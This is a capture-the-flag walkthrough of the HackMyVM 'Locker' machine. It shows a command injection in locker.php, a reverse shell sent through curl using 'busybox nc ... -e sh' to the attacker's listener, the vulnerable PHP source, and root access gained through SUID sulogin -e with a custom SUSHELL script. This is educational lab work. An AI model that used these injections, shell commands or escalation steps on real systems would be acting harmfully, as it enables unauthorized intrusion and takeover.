# Locker

## Information

## Solution
### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.34
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-11 08:10 +07
Nmap scan report for 10.11.5.34
Host is up (0.0010s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:78:3F:D0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.81 seconds
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sU --top-ports 100 10.11.5.34
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-11 08:45 +07
Nmap scan report for 10.11.5.34
Host is up (0.0022s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
MAC Address: 08:00:27:78:3F:D0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 112.66 seconds
```
![web](/walkthroughs/hackmyvm/machines/beginner/Locker/web.png)
![image](/walkthroughs/hackmyvm/machines/beginner/Locker/image1.png)
![image](/walkthroughs/hackmyvm/machines/beginner/Locker/image2.png)
![image](/walkthroughs/hackmyvm/machines/beginner/Locker/image3.png)
![image](/walkthroughs/hackmyvm/machines/beginner/Locker/image4.png)

#### Feroxbuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ feroxbuster -u http://10.11.5.34/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
                                                                                 
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.11.5.34/
 🚩  In-Scope Url          │ 10.11.5.34
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        2w       58c http://10.11.5.34/locker.php
200      GET        6l       15w      142c http://10.11.5.34/
[####################] - 5m    220546/220546  0s      found:2       errors:0      
[####################] - 5m    220545/220545  674/s   http://10.11.5.34/ 
```
#### Image Data Analysis
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl http://10.11.5.34/locker.php                  
<img src="data:image/jpg;base64,"width="150"height="150"/>

┌──(dungcngo㉿kali)-[/tmp]
└─$ curl http://10.11.5.34/locker.php?image=1
<img src="data:image/jpg;base64,UklGRpayAABXRUJQVlA4IIqyAADw4gKdASq8AlcDPoE+mUmlIyIkJbRKiKAQCWlulolePuh6nWxe
PzhrobGgu58gg2iVcDmLelKS+xgV55j7To2JjI1/075h01wS1+x55sRYvNq4Pf3D9Hvz7rp/UPe3
/qvcbu3/S+CH9w/iugns3/cfEOxq7OMAvfLzbvxj/F7Af+C9FvAQoGfpz/0+0t34P33/xfux8CH9
j6p3pUlS/EFMh6ZD0yHoXL54pjH0yVQQVN4OOpF/Eej/IUzL9OiPYOyvsKZD0yHpkPTIemQ9Mh6Y
wZvraENvmoZjfpaOOw3v6bv9vBlj7YOKpSQxNu66hvVZYs1H22/0uV/WeowNsbG2pTLfYG+wN9gb
7A32BvsDcXcHuh+z18/199xEKsfq1UyUn1r/3L0eEX0bzcvSOV6+ctcZxMq7Ei0CuRLJPcVgGokF
JQmxdFYQNCAGpNGFMh6ZD0yHpkPTIemQ8nmx7Rl7qnEeyz1yvN/0idUiFzb//c2xs4//0Vxm//JI
XHLIAJHp8SXg+d6j0ejLlYGHO9p57fvv0hZYgrwYLE0M4AROwTgnCSOltgkmhoxVuWgZb7A32Bvs
DfYG+wN9N452OKC9N3bCGh7LbcHEMe4Jqqy6x1eFuIH2/PMHZcj/1RtMC7h2oVv++wKlMVRk9F+2
8rz8oX7wzC
...


```

### Initial Access 
#### Command Injection Discovery
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -s "http://10.11.5.34/locker.php?image=1;id;"                        
<img src="data:image/jpg;base64,uid=33(www-data) gid=33(www-data) groups=33(www-data)
"width="150"height="150"> 
```
#### Reverse Shell Establishment
Terminal 1 (Listener setup)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444    
listening on [any] 4444 ...

```
Terminal 2 (Payload delivery)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -s "http://10.11.5.34/locker.php?image=1;busybox%20nc%2010.11.5.4%204444%20-e%20sh;"                    

```
Successful connection:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444    
listening on [any] 4444 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.34] 51206
id;hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
locker
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@locker:~/html$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                  
┌──(dungcngo㉿kali)-[/tmp]
└─$ stty raw -echo; fg             
[1]  + continued  nc -lvnp 4444
                               export SHELL=bash
www-data@locker:~/html$ export TERM=xterm-256color
www-data@locker:~/html$ reset
www-data@locker:~/html$ ls -la
total 196
drwxr-xr-x 2 root     root      4096 Jan 22  2021 .
drwxr-xr-x 3 root     root      4096 Jan 22  2021 ..
-rw-r--r-- 1 tolocker tolocker 45726 Jan 22  2021 1.jpg
-rw-r--r-- 1 tolocker tolocker 66605 Jan 22  2021 2.jpg
-rw-r--r-- 1 tolocker tolocker 62722 Jan 22  2021 3.jpg
-rw-r--r-- 1 root     root       142 Jan 22  2021 index.html
-rw-r--r-- 1 root     root       186 Jan 22  2021 locker.php
www-data@locker:~/html$ cat locker.php
<?php
$image = $_GET['image'];
$command = "cat ".$image.".jpg | base64";
$output = shell_exec($command);
print'<img src="data:image/jpg;base64,'.$output.'"width="150"height="150"/>';
?>

```

```bash
www-data@locker:~/html$ cd /home
www-data@locker:/home$ ls
tolocker
www-data@locker:/home$ cd tolocker/
www-data@locker:/home/tolocker$ ls
flag.sh  user.txt
www-data@locker:/home/tolocker$ ls -la
total 36
drwxr-xr-x 3 tolocker tolocker 4096 Jan 22  2021 .
drwxr-xr-x 3 root     root     4096 Jan 22  2021 ..
-rw------- 1 tolocker tolocker   52 Jan 22  2021 .Xauthority
-rw-r--r-- 1 tolocker tolocker  220 Jan 22  2021 .bash_logout
-rw-r--r-- 1 tolocker tolocker 3526 Jan 22  2021 .bashrc
drwxr-xr-x 3 tolocker tolocker 4096 Jan 22  2021 .local
-rw-r--r-- 1 tolocker tolocker  807 Jan 22  2021 .profile
-rwxr-xr-x 1 tolocker tolocker 1920 Jan 22  2021 flag.sh
-rw------- 1 tolocker tolocker   14 Jan 22  2021 user.txt
www-data@locker:/home/tolocker$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 47184 Jan 10  2019 /usr/sbin/sulogin
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
```
#### Sulogin Analysis
```bash
www-data@locker:/home/tolocker$ /usr/sbin/sulogin 

Cannot open access to console, the root account is locked.
See sulogin(8) man page for more details.

Press Enter to continue.

www-data@locker:/home/tolocker$ man sulogin
SULOGIN(8)                   System Administration                  SULOGIN(8)

NAME
       sulogin - single-user login

SYNOPSIS
       sulogin [options] [tty]

DESCRIPTION
       sulogin is invoked by init when the system goes into single-user mode.

       The user is prompted:

            Give root password for system maintenance
            (or type Control-D for normal startup):

       If  the root account is locked and --force is specified, no password is
       required.

       sulogin will be connected to the current terminal, or to  the  optional
       tty  device  that  can  be  specified  on  the  command line (typically
       /dev/console).

       When the user exits from the single-user shell, or presses control-D at
       the prompt, the system will continue to boot.

OPTIONS
       -e, --force
              If  the  default  method of obtaining the root password from the
              system via  getpwnam(3)  fails,  then  examine  /etc/passwd  and
              /etc/shadow  to get the password.  If these files are damaged or
              nonexistent, or when root account is locked by '!' or '*' at the
              begin of the password then sulogin will start a root shell with‐
              out asking for a password.

              Only use the -e option if you are sure the console is physically
              protected against unauthorized access.

       -p, --login-shell
              Specifying this option causes sulogin to start the shell process
              as a login shell.

       -t, --timeout seconds
              Specify the maximum amount of time to wait for user  input.   By
              default, sulogin will wait forever.

       -h, --help
              Display help text and exit.

       -V, --version
              Display version information and exit.

ENVIRONMENT VARIABLES
       sulogin looks for the environment variable SUSHELL or sushell to deter‐
       mine what shell to start.  If the environment variable is not  set,  it
       will  try  to execute root's shell from /etc/passwd.  If that fails, it
       will fall back to /bin/sh.

AUTHOR
       sulogin was written by Miquel van Smoorenburg for  sysvinit  and  later
       ported to util-linux by Dave Reisner and Karel Zak.

AVAILABILITY
       The  sulogin command is part of the util-linux package and is available
       from Linux Kernel Archive ⟨https://www.kernel.org/pub/linux/utils/util-
       linux/⟩.

util-linux                         July 2014                        SULOGIN(8)
```
Key findings:
- The `-e` option allows bypassing password requirements when the `root` account is locked.
- The `SUSHELL` environment variable determines which shell to execute.
- The shell runs with elevated privileges when invoked through `sulogin`.


### Privilege Escalation
```bash
www-data@locker:/home/tolocker$ /usr/sbin/sulogin -e
Press Enter for maintenance
(or press Control-D to continue): 
bash-5.0$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash-5.0$ 
bash-5.0$ exit
```

```bash
www-data@locker:/home/tolocker$ cat > /tmp/root.py << 'EOF'
> #!/usr/bin/python3
> import os
> os.setuid(0)
> os.setgid(0)
> os.system('/bin/bash')
> EOF
www-data@locker:/home/tolocker$ chmod +x /tmp/root.py
www-data@locker:/home/tolocker$ export SUSHELL=/tmp/root.py
www-data@locker:/home/tolocker$ /usr/sbin/sulogin -e
Press Enter for maintenance
(or press Control-D to continue): 
root@locker:~# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@locker:~# hostname
locker
```


***You are welcome!***
